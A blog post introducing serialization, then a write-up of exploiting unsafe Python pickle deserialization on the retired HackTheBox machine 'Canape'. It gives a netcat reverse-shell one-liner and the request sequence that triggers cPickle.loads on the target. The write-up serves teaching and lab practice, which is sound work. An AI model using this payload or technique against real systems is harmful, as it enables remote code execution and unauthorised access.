---
layout: post
title: Deserialization
---

<h3>What is serialization?</h3>

To understand deserialization, we must understand serialization. Modern applications are often decentralized and as such, utilize multiple components (such as microservices) that talk to one another and share and store data. Serialization is used to convert an object into something that can be shared across a network or stored in a file.

For example, JSON is a popular choice for serializing complex data objects into simple strings so that they might be transported or stored. The restoration of serialized data back into their complex object form is known as deserialization.

Let's serialize something simple using ruby and json. We first need to require the <b>“json”</b> module. 

{% highlight rb %}
irb(main):002:0> require 'json'
=> true
irb(main):003:0> glanton_gang = {newbie: "the kid", outlaw: "toadvine", priest: "tobin", captain: "glanton", devil: "the judge"}
=> {:newbie=>"the kid", :outlaw=>"toadvine", :priest=>"tobin", :captain=>"glanton", :devil=>"the judge"}
irb(main):004:0> glanton_gang.class
=> Hash
irb(main):005:0> glanton_gang_json = glanton_gang.to_json
=> "{\"newbie\":\"the kid\",\"outlaw\":\"toadvine\",\"priest\":\"tobin\",\"captain\":\"glanton\",\"devil\":\"the judge\"}"
irb(main):006:0> glanton_gang_json.class
=> String
irb(main):007:0>
{% endhighlight %}

This is a straightforward example of serialization, in which our data object of a hash is being converted into strings by way of the <b>to_json</b> method. This makes our data language agnostic and ready to be stored in a file. 

Serialization is common in architectures that include APIs, microservices, and client-side MVC. When the data being serialized is trusted (such as, by the system), there is no issue. However, when a user can control or modify input, deserialization vulnerabilities can arise. The conversion back from string (or whatever form the serialized data is stored as) to binary can be tampered with and result in remote code execution. It’s important to note that not all forms of serialization involve serializing to strings, for example, one method of serializing data in python uses the <b>pickle</b> module. 

Python’s <A href="https://docs.python.org/3/library/pickle.html">pickle module</a> implements binary protocol for serializing and deserializing a python object. “Pickling” is the process whereby a Python object hierarchy is converted into a byte stream, and “unpickling” is the inverse operation, whereby a byte stream (from a binary file or bytes-like object) is converted back into an object hierarchy. In other words, pickling == serializing and depickling == deserializing. 

At the top of the docs is a big fat warning: <b>The pickle module is not secure. Only unpickle data you trust.</b> We'll take a look at a flask application that fails to adhere to such a warning.

<h3>Unsafe Deserialization: HTB's <i>Canape</i></h3>

We are going to be examining a small portion of the retired hackthebox (HTB) box <b>“Canape”</b>, which contains a vulnerable pickle function that deserializes unsanitized user data. The box in question is hosting a flask application on port 80, and after running a gobuster scan with a lengthy wordlist we discover the git configuration file. We add this git subdomain to our /etc/hosts file and then we can view the flask app's git repository. This will inform us on what's going on behind the scenes and how to craft our exploit.

The vulnerable page in question:
![Quotes form submission](/images/canape/quotes.png)

The vulnerable code in question:
![Flask app code](/images/canape/pickle-code-vuln.png)

This is not the full <b>\_\_init\_\_.py</b> file but it contains what we're interested in. On the webpage we can see that we can submit a Simpsons’ character and a quote. Looking at the code, specifically the “submit” route, we can see that on a form submission the application looks for a character and quote. It then checks if the character is whitelisted. If the submitted character is whitelisted, then the code goes on to process the quote (regardless if the quote is valid; it only checks if the quote is empty or not), and stores the data in a pickle file with an md5 filename. 

The dangerous portion of this application is the above combined with the check route, which proceeds to open the file containing the user-submitted character and quote depending on an ‘id’ POST parameter. It then deserializes the user-submitted data by way of <b>cPickle.loads(data)</b>. Thankfully, we know exactly how to name our file: <b>p_id = md5(char + quote).hexidigest()</b>.

So, to recap, we will be taking the following steps to exploit this unsafe deserialization:
1. Submit a valid character name
1. Submit a quote that is actually an os.system command that connects to our local listener
1. The application will load our data using <b>cPickle.loads(data)</b>
1. Our exploit is triggered and our listener receives a shell


We look at the vulnerable code as we craft our exploit. We need to import the following libraries:
* Os: to run system commands
* Requests: to made requests to the vulnerable flask application
* Md5: to name our file properly (following the flask app's file-naming convention)
* cPickle: <b>cPickle</b> is an optimized version of the pickle module written in C, and it is what our vulnerable application is using, so we will use it in the exploit

Our exploit code:
![Exploit code](/images/canape/exploit.png)


A quick examination of our exploit code:

<h6>def __reduce__(self);</h6>

<b>pickle</b> allows arbitrary objects to declare how they should be pickled by defining a __reduce__ method, which should return either a string or a tuple describing how to reconstruct this object on unpacking.[^1] 

We are constructing a pickle that, upon unpickling, will execute:
<b>homer!;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.29 5555 >/tmp/f</b>

For whatever reason I'm partial to the above one-liner, though it's likely poor practice to assume netcat is on machines. From my previous experience of working on this box, I know the above will execute. However, if this wasn't the case, there are plenty of other options for getting a shell, including calling upon python's <b>subprocess</b> module.

<h6>cPickle.dumps</h6>
Returns the pickled object as a bytes object (meaning, it is serialized). 

<h6>char, quote = sc.split(“!”)</h6>
We are splitting the character and quote on the exclamation point, meaning, everything before the exclamation point is equal to the character (homer), everything after is the quote. We need to do this to adhere to the check performed on the character parameter.

<h6>p_id = md5(char + quote).hexdigest()</h6>
We are naming our file following the conventions set out in the flask application.

<h6>requests.post('http://10.10.10.70/submit', data={'character': char, 'quote': quote})</h6>
We are submitting a post request to the submit page, with our character and quote

<h6>requests.post('http://10.10.10.70/check', data={'id': p_id})</h6>
We are submitting a post request to the vulnerable check page, with the id of our pickled file. This triggers the vulnerable <b>cPickle.loads(data)</b>, which deserializes our data and executes the connection back to our reverse shell.

Now we will run our exploit, and voila, we have a shell!

![Shell](/images/canape/shell.png)


[^1]: <a href="https://blog.nelhage.com/2011/03/exploiting-pickle/">https://blog.nelhage.com/2011/03/exploiting-pickle</a>
